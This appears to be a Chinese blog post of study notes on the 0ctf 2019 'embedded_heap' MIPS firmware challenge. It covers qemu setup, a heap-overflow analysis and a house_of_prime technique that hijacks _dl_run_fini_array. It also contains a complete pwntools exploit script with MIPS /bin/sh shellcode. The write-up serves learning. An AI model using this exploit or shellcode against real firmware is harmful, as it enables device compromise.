---
layout: post
title: 固件安全-embedd_heap
description: 学习固件安全中的heap,持续更新....
categories:  固件安全
---



# 固件安全

## 前言

本篇是我学习固件安全的技术笔记，包括我遇到的问题，以及解决的方式

## 工具

常用工具:

1.qemu

2.IDA

3.Ghidra



# 如何用qemu-system-mips 启动embedd_heap

1.传文件到qemu

宿主机 ifconfig tap0 10.0.0.1 qemu要ifconfig eth0 ip 10.0.0.2

宿主机用python -m SimpleHttpserver 8080 启动一个简单的http服务

qemu用wget IP：8080/*.tar.gz 获取文件，80%要压缩文件

2.解压到qemu中，然后将elf文件目录下的lib扔到/lib,然后chmod 777 /lib/*

然后启动./embedd_heap就可以了



# 搭建MIPS环境

https://blog.csdn.net/u012763794/article/details/82750102

https://e3pem.github.io/2019/08/23/mips-pwn/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/

## 1.堆溢出-embedd_heap

### 逻辑分析

main函数：

1.update：更新堆的size,填充内容

2.view: 查看堆的内容

3.pwn:continuous delete two heap  并且update heap
 ![](/images/character5/firm1.png)




Update:通过update我们可以看到，我们可以填入size，并且输入跟size大小相同的内容，同时这里有个堆溢出的漏洞，因为我们输入完size之后，该heap并没有重新calloc相同size的大小，主要我们分配的size比之前的大，那我们就可以进行堆溢出

 ![](/images/character5/firm2.png)


![](/images/character5/firm3.png)


view：就是输出heap对应size的内容

![](/images/character5/firm5.png)

del：free heap，同时将heap所对应的指针置0，也就是说没有UAF


![](/images/character5/firm5.png)


## 漏洞利用思路

固件一般使用ulibc,可认为是旧版的glibc

在旧版的glibc中malloc_state数据结构

```
struct malloc_state {

  /* The maximum chunk size to be eligible for fastbin */
  size_t  max_fast;   /* low 2 bits used as flags */

  /* Fastbins */
  mfastbinptr      fastbins[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr        top;

  /* The remainder from the most recent split of a small request */
  mchunkptr        last_remainder;

  /* Normal bins packed as described above */
  mchunkptr        bins[NBINS * 2];

  /* Bitmap of bins. Trailing zero map handles cases of largest binned size */
  unsigned int     binmap[BINMAPSIZE+1];

  /* Tunable parameters */
  unsigned long     trim_threshold;
  size_t  top_pad;
  size_t  mmap_threshold;

  /* Memory map support */
  int              n_mmaps;
  int              n_mmaps_max;
  int              max_n_mmaps;

  /* Cache malloc_getpagesize */
  unsigned int     pagesize;

  /* Track properties of MORECORE */
  unsigned int     morecore_properties;

  /* Statistics */
  size_t  mmapped_mem;
  size_t  sbrked_mem;
  size_t  max_sbrked_mem;
  size_t  max_mmapped_mem;
  size_t  max_total_mem;
};
```

在新版glibc中max_fast改为了全局变量

所以可以使用house_of_prime的方式

```
#define fastbin_index(sz)        ((((unsigned int)(sz)) >> 3) - 2)
```

将max_fast修改为一个堆地址,8>>3-2 = -1即可，这样max_fast变为一个非常大的值，我们可以继续利用上面这段代码将某个变量改为堆地址。

由于在mips中不支持nx这种方式，所以可直接指定将_dl_run_fini_array的函数指向我们的堆地址然后执行exit的时候执行里面的代码的时候会调用_dl_run_fini_array的函数，这样就可以执行我们的shellcode了



\# **在qemu-system-mode下可以查看堆地址**



# EXP

```python
from pwn import *
p = remote('192.168.122.12',"9999")
context.log_level = 'debug'
context.arch = "mips"
context.endian = 'big'
chunks_size = []

def get_chunk_size():
    for i in range(3):
        p.recvuntil("Chunk["+str(i)+"]:")
        size = int(p.recvuntil("bytes",drop=True))
        #log.success("chunk_size:"+chunk_size)
        #size = int(chunk_size) & 0xff0
        #log.success("chunk_size:"+str(hex(size)))
        if size%4==0:
            if size%8==0:
                    size = size+4
            else:
                    pass
        else:
            size = size+4-size%4
            if size%8==0:
                    size = size+4
        if size <= 8:
                size = 12
        chunks_size.append(size)
        log.success("chunk_size:"+str(hex(size)))
def choice(idx):
    p.sendlineafter("Command",str(idx))

def update(idx,size,content):
    choice(1)
    print str(size)
    p.sendlineafter("Index",str(idx))
    p.sendlineafter("Size",str(size))
    p.sendafter("Content",content)

def view():
    choice(2)

def pwn_over(idx1,idx2,idx3,size,content):
    choice(3)
    p.sendlineafter("Index",str(idx1))
    p.sendlineafter("Index",str(idx2))
    p.sendlineafter("Index",str(idx3))
    raw_input()
    p.sendlineafter("Size",str(size))
    p.sendafter("Content",content)

get_chunk_size()
payload1 = 'a'*chunks_size[0]+p32(0x9) 
update(0,len(payload1),payload1) #heap_over_size
payload2 = 'b'*chunks_size[2]+p32(0x305d9) 
#raw_input()
update(2,len(payload2),payload2)
buf =  ""
buf += "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27"
buf += "\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4"
buf += "\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f"
buf += "\xab\x01\x01\x01\x0c\x2f\x62\x69\x6e\x2f\x73\x68\x00"

payload3 = 'a'*(chunks_size[2]-4)+buf #prev_size + size
pwn_over(1,3,2,len(payload3),payload3)
p.interactive()
```



# 遇到的问题

1. 开启gdbserver卡在监听端口

换到3.2.0+-vmlinux就可以了

2. 用socat兼调试gdbserver

   ./socat tcp-l:9999,fork exec:./embedded_heap & (sh run.sh &)

   

 





# 参考

https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/

